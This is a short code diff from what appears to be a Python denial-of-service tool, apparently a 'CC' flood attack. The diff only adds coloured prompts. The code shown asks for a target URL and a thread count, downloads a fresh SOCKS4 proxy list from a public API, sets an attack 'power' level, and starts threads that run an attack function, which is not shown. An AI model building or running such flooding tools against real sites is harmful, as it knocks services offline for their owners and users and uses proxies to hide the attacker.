@@ -34,17 +34,17 @@ def main():
 	global proxy
 	global url
 	global pow
-	url = str(input("Target : "))
-	thr = int(input("Threads : "))
-	cho = str(input("Get Some Fresh Socks ? (y/n) : "))
+	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
+	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
+	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
 		rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=socks4')
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
 	else:
 		pass
-	list = str(input("Socks List (socks.txt): "))
-	pow = int(input("CC.Power (1-100) : "))
+	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
+	pow = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
 	for x in range(thr):
 		x = Thread(target=atk, name=(x))
 		x.start()
